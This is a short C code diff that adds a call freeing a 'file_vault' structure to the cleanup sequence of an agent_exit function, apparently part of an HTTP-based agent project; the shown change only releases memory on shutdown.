@@ -42,6 +42,7 @@ void agent_exit(AgentState *state, AgentCapabilities *cap, TaskInfo *task) {
 
 	HttpDestroy(state->http);
 	free_params(&state->params);
+	free_vault(&state->file_vault);
 	free_builtin_picos(cap);	
 	
 	#ifdef CELEBI_EXIT_THREAD
